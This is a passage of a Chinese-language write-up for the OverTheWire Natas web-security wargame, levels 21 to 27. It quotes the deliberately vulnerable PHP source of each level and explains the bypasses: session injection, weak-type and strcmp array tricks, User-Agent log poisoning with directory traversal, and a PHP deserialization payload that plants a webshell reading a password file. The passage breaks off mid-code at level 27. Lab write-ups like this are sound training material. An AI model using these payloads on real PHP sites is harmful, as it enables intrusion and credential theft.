+    <span style=color:#66d9ef>foreach</span>($_REQUEST <span style=color:#66d9ef>as</span> $key <span style=color:#f92672>=&gt;</span> $val) {
+    $_SESSION[$key] <span style=color:#f92672>=</span> $val;
+    }
+}
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;debug&#34;</span>, $_GET)) {
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;[DEBUG] Session contents:&lt;br&gt;&#34;</span>;
+    <span style=color:#a6e22e>print_r</span>($_SESSION);
+}
+
+<span style=color:#75715e>// only allow these keys
+</span><span style=color:#75715e></span>$validkeys <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;align&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;center&#34;</span>, <span style=color:#e6db74>&#34;fontsize&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;100%&#34;</span>, <span style=color:#e6db74>&#34;bgcolor&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;yellow&#34;</span>);
+$form <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+
+$form <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;form action=&#34;index.php&#34; method=&#34;POST&#34;&gt;&#39;</span>;
+<span style=color:#66d9ef>foreach</span>($validkeys <span style=color:#66d9ef>as</span> $key <span style=color:#f92672>=&gt;</span> $defval) {
+    $val <span style=color:#f92672>=</span> $defval;
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>($key, $_SESSION)) {
+    $val <span style=color:#f92672>=</span> $_SESSION[$key];
+    } <span style=color:#66d9ef>else</span> {
+    $_SESSION[$key] <span style=color:#f92672>=</span> $val;
+    }
+    $form <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$key</span><span style=color:#e6db74>: &lt;input name=&#39;</span><span style=color:#e6db74>$key</span><span style=color:#e6db74>&#39; value=&#39;</span><span style=color:#e6db74>$val</span><span style=color:#e6db74>&#39; /&gt;&lt;br&gt;&#34;</span>;
+}
+$form <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Update&#34; /&gt;&#39;</span>;
+$form <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;/form&gt;&#39;</span>;
+
+$style <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;background-color: &#34;</span><span style=color:#f92672>.</span>$_SESSION[<span style=color:#e6db74>&#34;bgcolor&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;; text-align: &#34;</span><span style=color:#f92672>.</span>$_SESSION[<span style=color:#e6db74>&#34;align&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;; font-size: &#34;</span><span style=color:#f92672>.</span>$_SESSION[<span style=color:#e6db74>&#34;fontsize&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;;&#34;</span>;
+$example <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;div style=&#39;</span><span style=color:#e6db74>$style</span><span style=color:#e6db74>&#39;&gt;Hello world!&lt;/div&gt;&#34;</span>;
+
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>可以看到，与之相关的操作都在这里定义了。可以看到，这里有一个与上一题类似的 session 设置操作，但是这一题是直接对请求的所有内容都设置了。也就是说，这一题并没有限制请求的变量是什么，那就更简单了。
+我们首先在第二个网页提交，使 admin=1，然后获取这个会话的 session，然后使用这个 session 访问第一个页面。</p>
+<h2 id=level-21-22>Level 21->22:</h2>
+<p>这次网页什么都没有，直接让看源码。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+<span style=color:#a6e22e>session_start</span>();
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;revelio&#34;</span>, $_GET)) {
+    <span style=color:#75715e>// only admins can reveal the password
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>($_SESSION <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;admin&#34;</span>, $_SESSION) <span style=color:#66d9ef>and</span> $_SESSION[<span style=color:#e6db74>&#34;admin&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>)) {
+    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: /&#34;</span>);
+    }
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>&lt;?
+</span><span style=color:#960050;background-color:#1e0010>    if(array_key_exists(&#34;revelio&#34;, $_GET)) {
+</span><span style=color:#960050;background-color:#1e0010>    print &#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;;
+</span><span style=color:#960050;background-color:#1e0010>    print &#34;&lt;pre&gt;Username: natas23\n&#34;;
+</span><span style=color:#960050;background-color:#1e0010>    print &#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;;
+</span><span style=color:#960050;background-color:#1e0010>    }
+</span><span style=color:#960050;background-color:#1e0010>?&gt;
+</span></code></pre></div><p>可以看到两段 PHP 代码，都是检测是否有 <strong>revelio</strong>，前面一段代表表示如果有这个键同时没有设置 admin==1 的话，就会重定向。第二段则是直接显示密码。那就简单了，使用 BP 抓包，看看重定向跳转前的网页就行了。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas22.png alt=natas22></p>
+<h1 id=level-2227>Level 22~27</h1>
+<h2 id=level-22-23>Level 22->23:</h2>
+<p>看看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;passwd&#34;</span>,$_REQUEST)){        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strstr</span>($_REQUEST[<span style=color:#e6db74>&#34;passwd&#34;</span>],<span style=color:#e6db74>&#34;iloveyou&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> ($_REQUEST[<span style=color:#e6db74>&#34;passwd&#34;</span>] <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span> )){            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&#34;</span>;            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span>;        }        <span style=color:#66d9ef>else</span>{            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;Wrong!&lt;br&gt;&#34;</span>;        }    }    <span style=color:#75715e>// morla / 10111?&gt; 
+</span></code></pre></div><p>可以看出只要满足两个条件就能显示密码，第一个条件使用 strstr 函数，返回 <strong>iloveyou</strong> 在 passwd 中第一次出现的位置，只要不为零，也就是存在且不在开头；第二条件是大于10。这里应该是打算考一下 PHP 的弱类型比较，因为要含有 <strong>iloveyou</strong> ，那么 passwd 肯定是一个字符串，字符串和数字比较，会把字符串转换为数字，简单来说就是如果前面几个字符为数字们就会转换为对应数值，否则为0。
+那就简单了，直接构造 <code>passwd=100iloveyou</code> 就行了。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas23.png alt=natas23></p>
+<h2 id=level-23-24>Level 23->24:</h2>
+<p>同样是直接看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;passwd&#34;</span>,$_REQUEST)){        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>strcmp</span>($_REQUEST[<span style=color:#e6db74>&#34;passwd&#34;</span>],<span style=color:#e6db74>&#34;&lt;censored&gt;&#34;</span>)){            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&#34;</span>;            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span>;        }        <span style=color:#66d9ef>else</span>{            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;Wrong!&lt;br&gt;&#34;</span>;        }    }    <span style=color:#75715e>// morla / 10111?&gt;  
+</span></code></pre></div><p>这次使用的是 strcmp 比较，如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。 而这里是取反了，所以只有返回值为 0 的时候才会返回密码。
+但是我们不知道密码，肯定不能正常的比较得出0。所以这里利用的是 strcmp 比较的漏洞。如果比较的参数是数组的话，函数也会返回0，那么我们只要将传入的 passwd 改成数组就行了。
+<code>http://natas24.natas.labs.overthewire.org/?passwd[]=a</code>
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas24.png alt=natas24></p>
+<h2 id=level-24-25>Level 24->25：</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>    <span style=color:#75715e>// cheers and &lt;3 to malvina    // - morla    function setLanguage(){        /* language setup */        if(array_key_exists(&#34;lang&#34;,$_REQUEST))            if(safeinclude(&#34;language/&#34; . $_REQUEST[&#34;lang&#34;] ))                return 1;        safeinclude(&#34;language/en&#34;);     }        function safeinclude($filename){        // check for directory traversal        if(strstr($filename,&#34;../&#34;)){            logRequest(&#34;Directory traversal attempt! fixing request.&#34;);            $filename=str_replace(&#34;../&#34;,&#34;&#34;,$filename);        }        // dont let ppl steal our passwords        if(strstr($filename,&#34;natas_webpass&#34;)){            logRequest(&#34;Illegal file access detected! Aborting!&#34;);            exit(-1);        }        // add more checks...        if (file_exists($filename)) {             include($filename);            return 1;        }        return 0;    }        function listFiles($path){        $listoffiles=array();        if ($handle = opendir($path))            while (false !== ($file = readdir($handle)))                if ($file != &#34;.&#34; &amp;&amp; $file != &#34;..&#34;)                    $listoffiles[]=$file;                closedir($handle);        return $listoffiles;    }         function logRequest($message){        $log=&#34;[&#34;. date(&#34;d.m.Y H::i:s&#34;,time()) .&#34;]&#34;;        $log=$log . &#34; &#34; . $_SERVER[&#39;HTTP_USER_AGENT&#39;];        $log=$log . &#34; \&#34;&#34; . $message .&#34;\&#34;\n&#34;;         $fd=fopen(&#34;/var/www/natas/natas25/logs/natas25_&#34; . session_id() .&#34;.log&#34;,&#34;a&#34;);        fwrite($fd,$log);        fclose($fd);    }?&gt;
+</span></code></pre></div><p>看起来应该是文件包含想办法包含密码所在的文件。我们知道密码应该是在 <strong>/etc/natas_webpass/natas26</strong> 中的，如果能包含这个文件，显示出内容就可以获得密码。但是这里有一个 <em>safeinclude</em>，很明显设置了一些过滤。第一个会替换 <strong>../</strong> 为空，这个好办，只要构造类似 <strong>&mldr;.//</strong> 这样的i形式就可以了；但是第二个就麻烦了，因为只要存在 <em>natas_webpass</em> 就直接报错退出。
+继续往下看发下有一个 <em>logrequest</em> 函数，不仅接受信息，甚至还能 将其保存在文件中。因此，如果在传入的 <strong>HTTP_USER_AGENT</strong> 中添加木马，在前面的函数包含这个文件，那就可以获取到密码了。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas25.png alt=natas25-1>
+（一开始没有反应过来已经显示密码了，试了试其他语句才反应过来，所以密码又重复了几次。)</p>
+<h2 id=level-25-26>Level 25->26：</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#75715e>// sry, this is ugly as hell.
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// cheers kaliman ;)
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// - morla
+</span><span style=color:#75715e></span>    
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Logger</span>{
+        <span style=color:#66d9ef>private</span> $logFile;
+        <span style=color:#66d9ef>private</span> $initMsg;
+        <span style=color:#66d9ef>private</span> $exitMsg;
+      
+        <span style=color:#66d9ef>function</span> __construct($file){
+            <span style=color:#75715e>// initialise variables
+</span><span style=color:#75715e></span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>initMsg</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#--session started--#</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exitMsg</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#--session end--#</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/natas26_&#34;</span> <span style=color:#f92672>.</span> $file <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;.log&#34;</span>;
+      
+            <span style=color:#75715e>// write initial message
+</span><span style=color:#75715e></span>            $fd<span style=color:#f92672>=</span><span style=color:#a6e22e>fopen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span>,<span style=color:#e6db74>&#34;a+&#34;</span>);
+            <span style=color:#a6e22e>fwrite</span>($fd,$initMsg);
+            <span style=color:#a6e22e>fclose</span>($fd);
+        }                       
+      
+        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>log</span>($msg){
+            $fd<span style=color:#f92672>=</span><span style=color:#a6e22e>fopen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span>,<span style=color:#e6db74>&#34;a+&#34;</span>);
+            <span style=color:#a6e22e>fwrite</span>($fd,$msg<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+            <span style=color:#a6e22e>fclose</span>($fd);
+        }                       
+      
+        <span style=color:#66d9ef>function</span> __destruct(){
+            <span style=color:#75715e>// write exit message
+</span><span style=color:#75715e></span>            $fd<span style=color:#f92672>=</span><span style=color:#a6e22e>fopen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span>,<span style=color:#e6db74>&#34;a+&#34;</span>);
+            <span style=color:#a6e22e>fwrite</span>($fd,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exitMsg</span>);
+            <span style=color:#a6e22e>fclose</span>($fd);
+        }                       
+    }
+ 
+    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>showImage</span>($filename){
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>file_exists</span>($filename))
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;img src=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$filename\</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;;
+</span><span style=color:#e6db74>    }
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>    function drawImage(</span><span style=color:#e6db74>$filename</span><span style=color:#e6db74>){
+</span><span style=color:#e6db74>        </span><span style=color:#e6db74>$img</span><span style=color:#e6db74>=imagecreatetruecolor(400,300);
+</span><span style=color:#e6db74>        drawFromUserdata(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>);
+</span><span style=color:#e6db74>        imagepng(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>,</span><span style=color:#e6db74>$filename</span><span style=color:#e6db74>);     
+</span><span style=color:#e6db74>        imagedestroy(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>);
+</span><span style=color:#e6db74>    }
+</span><span style=color:#e6db74>    
+</span><span style=color:#e6db74>    function drawFromUserdata(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>){
+</span><span style=color:#e6db74>        if( array_key_exists(&#34;</span><span style=color:#a6e22e>x1</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>) &amp;&amp; array_key_exists(&#34;</span><span style=color:#a6e22e>y1</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>) &amp;&amp;
+</span><span style=color:#e6db74>            array_key_exists(&#34;</span><span style=color:#a6e22e>x2</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>) &amp;&amp; array_key_exists(&#34;</span><span style=color:#a6e22e>y2</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>)){
+</span><span style=color:#e6db74>        
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$color</span><span style=color:#e6db74>=imagecolorallocate(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>,0xff,0x12,0x1c);
+</span><span style=color:#e6db74>            imageline(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>,</span><span style=color:#e6db74>$_GET[&#34;x1&#34;]</span><span style=color:#e6db74>, </span><span style=color:#e6db74>$_GET[&#34;y1&#34;]</span><span style=color:#e6db74>, 
+</span><span style=color:#e6db74>                            </span><span style=color:#e6db74>$_GET[&#34;x2&#34;]</span><span style=color:#e6db74>, </span><span style=color:#e6db74>$_GET[&#34;y2&#34;]</span><span style=color:#e6db74>, </span><span style=color:#e6db74>$color</span><span style=color:#e6db74>);
+</span><span style=color:#e6db74>        }
+</span><span style=color:#e6db74>        
+</span><span style=color:#e6db74>        if (array_key_exists(&#34;</span><span style=color:#a6e22e>drawing</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_COOKIE</span><span style=color:#e6db74>)){
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74>=unserialize(base64_decode(</span><span style=color:#e6db74>$_COOKIE[&#34;drawing&#34;]</span><span style=color:#e6db74>));
+</span><span style=color:#e6db74>            if(</span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74>)
+</span><span style=color:#e6db74>                foreach(</span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74> as </span><span style=color:#e6db74>$object</span><span style=color:#e6db74>)
+</span><span style=color:#e6db74>                    if( array_key_exists(&#34;</span><span style=color:#a6e22e>x1</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$object</span><span style=color:#e6db74>) &amp;&amp; 
+</span><span style=color:#e6db74>                        array_key_exists(&#34;</span><span style=color:#a6e22e>y1</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$object</span><span style=color:#e6db74>) &amp;&amp;
+</span><span style=color:#e6db74>                        array_key_exists(&#34;</span><span style=color:#a6e22e>x2</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$object</span><span style=color:#e6db74>) &amp;&amp; 
+</span><span style=color:#e6db74>                        array_key_exists(&#34;</span><span style=color:#a6e22e>y2</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$object</span><span style=color:#e6db74>)){
+</span><span style=color:#e6db74>                    
+</span><span style=color:#e6db74>                        </span><span style=color:#e6db74>$color</span><span style=color:#e6db74>=imagecolorallocate(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>,0xff,0x12,0x1c);
+</span><span style=color:#e6db74>                        imageline(</span><span style=color:#e6db74>$img</span><span style=color:#e6db74>,</span><span style=color:#e6db74>$object[&#34;x1&#34;]</span><span style=color:#e6db74>,</span><span style=color:#e6db74>$object[&#34;y1&#34;]</span><span style=color:#e6db74>,
+</span><span style=color:#e6db74>                                </span><span style=color:#e6db74>$object[&#34;x2&#34;]</span><span style=color:#e6db74> ,</span><span style=color:#e6db74>$object[&#34;y2&#34;]</span><span style=color:#e6db74> ,</span><span style=color:#e6db74>$color</span><span style=color:#e6db74>);
+</span><span style=color:#e6db74>            
+</span><span style=color:#e6db74>                    }
+</span><span style=color:#e6db74>        }    
+</span><span style=color:#e6db74>    }
+</span><span style=color:#e6db74>    
+</span><span style=color:#e6db74>    function storeData(){
+</span><span style=color:#e6db74>        </span><span style=color:#e6db74>$new_object</span><span style=color:#e6db74>=array();
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>        if(array_key_exists(&#34;</span><span style=color:#a6e22e>x1</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>) &amp;&amp; array_key_exists(&#34;</span><span style=color:#a6e22e>y1</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>) &amp;&amp;
+</span><span style=color:#e6db74>            array_key_exists(&#34;</span><span style=color:#a6e22e>x2</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>) &amp;&amp; array_key_exists(&#34;</span><span style=color:#a6e22e>y2</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_GET</span><span style=color:#e6db74>)){
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$new_object[&#34;x1&#34;]</span><span style=color:#e6db74>=</span><span style=color:#e6db74>$_GET[&#34;x1&#34;]</span><span style=color:#e6db74>;
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$new_object[&#34;y1&#34;]</span><span style=color:#e6db74>=</span><span style=color:#e6db74>$_GET[&#34;y1&#34;]</span><span style=color:#e6db74>;
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$new_object[&#34;x2&#34;]</span><span style=color:#e6db74>=</span><span style=color:#e6db74>$_GET[&#34;x2&#34;]</span><span style=color:#e6db74>;
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$new_object[&#34;y2&#34;]</span><span style=color:#e6db74>=</span><span style=color:#e6db74>$_GET[&#34;y2&#34;]</span><span style=color:#e6db74>;
+</span><span style=color:#e6db74>        }
+</span><span style=color:#e6db74>        
+</span><span style=color:#e6db74>        if (array_key_exists(&#34;</span><span style=color:#a6e22e>drawing</span><span style=color:#e6db74>&#34;, </span><span style=color:#e6db74>$_COOKIE</span><span style=color:#e6db74>)){
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74>=unserialize(base64_decode(</span><span style=color:#e6db74>$_COOKIE[&#34;drawing&#34;]</span><span style=color:#e6db74>));
+</span><span style=color:#e6db74>        }
+</span><span style=color:#e6db74>        else{
+</span><span style=color:#e6db74>            // create new array
+</span><span style=color:#e6db74>            </span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74>=array();
+</span><span style=color:#e6db74>        }
+</span><span style=color:#e6db74>        
+</span><span style=color:#e6db74>        </span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74>[]=</span><span style=color:#e6db74>$new_object</span><span style=color:#e6db74>;
+</span><span style=color:#e6db74>        setcookie(&#34;</span><span style=color:#a6e22e>drawing</span><span style=color:#e6db74>&#34;,base64_encode(serialize(</span><span style=color:#e6db74>$drawing</span><span style=color:#e6db74>)));
+</span><span style=color:#e6db74>    }
+</span><span style=color:#e6db74>?&gt;
+</span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>session_start</span>();
+
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;drawing&#34;</span>, $_COOKIE) <span style=color:#f92672>||</span>
+        (   <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;x1&#34;</span>, $_GET) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;y1&#34;</span>, $_GET) <span style=color:#f92672>&amp;&amp;</span>
+            <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;x2&#34;</span>, $_GET) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;y2&#34;</span>, $_GET))){  
+        $imgfile<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;img/natas26_&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>session_id</span>() <span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.png&#34;</span>; 
+        <span style=color:#a6e22e>drawImage</span>($imgfile); 
+        <span style=color:#a6e22e>showImage</span>($imgfile);
+        <span style=color:#a6e22e>storeData</span>();
+    }
+    
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>代码量稍微有点大，但是简单分析就可以看出，<em>x1,x2,y1,y2</em> 相关的应该没什么用，比较有用的就是 cookie 中有一个 drawing，因为他是可控的，而且进行了序列化操作，这意味我们可以通过它来创建一个对象。此外就是 Logger 类也值得关注，因为他有读写文件的操作。
+再回到代码，有一个奇怪的现象，在文件开始出现了 Logger 这个类，但是在之后却没有再用到，他似乎就只是简单的记录了一下 “我来了”、“我走了”，再没有什么用了，而且也接受参数。
+考虑到这里，结合反序列化操作，于是想到一个思路：通过 drawing 传入一个 <em>Logger</em> 对象，并且在 <em>exitmsg</em> 中写入一句话木马，通过 __destruct()将其写入一个文件里，由于 <em>logfile</em> 也是可以控制的，因此可以写入一个 php 文件，再访问这个文件就可以执行木马，从而拿到密码。
+考虑到是私有属性，这里使用 php 来生成序列化后的字符串。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Logger</span>{
+    <span style=color:#66d9ef>private</span> $logFile;
+    <span style=color:#66d9ef>private</span> $initMsg;
+    <span style=color:#66d9ef>private</span> $exitMsg;
+  
+    <span style=color:#66d9ef>function</span> __construct(){
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>initMsg</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#--session started--#&#34;</span>;
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exitMsg</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;?php echo file_get_contents(&#39;/etc/natas_webpass/natas27&#39;); ?&gt;&#34;</span>;
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./img/asd.php&#34;</span>;
+    }  
+   
+}
+
+$logger <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Logger</span>();
+<span style=color:#75715e>// echo serialize($logger);
+</span><span style=color:#75715e></span><span style=color:#a6e22e>print_r</span>(<span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>serialize</span>($logger)));
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>接着抓包，将Cookie 中的 drawing 值换成转换后的字符串：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas26.png alt=natas26></p>
+<p>然后访问文件保存的位置，/img/asd.php:
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas26-2.png alt=natas26-2></p>
+<h1 id=27>27~</h1>
+<h2 id=level-26-27>Level 26->27:</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+
+<span style=color:#75715e>// morla / 10111
+</span><span style=color:#75715e>// database gets cleared every 5 min 
+</span><span style=color:#75715e></span>
+
+<span style=color:#75715e>/*
+</span><span style=color:#75715e>CREATE TABLE `users` (
+</span><span style=color:#75715e>  `username` varchar(64) DEFAULT NULL,
+</span><span style=color:#75715e>  `password` varchar(64) DEFAULT NULL
+</span><span style=color:#75715e>);
+</span><span style=color:#75715e>*/</span>
+
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>checkCredentials</span>($link,$usr,$pass){
+ 
+    $user<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_real_escape_string</span>($usr);
+    $password<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_real_escape_string</span>($pass);
+    
+    $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT username from users where username=&#39;</span><span style=color:#e6db74>$user</span><span style=color:#e6db74>&#39; and password=&#39;</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>&#39; &#34;</span>;
+    $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($query, $link);
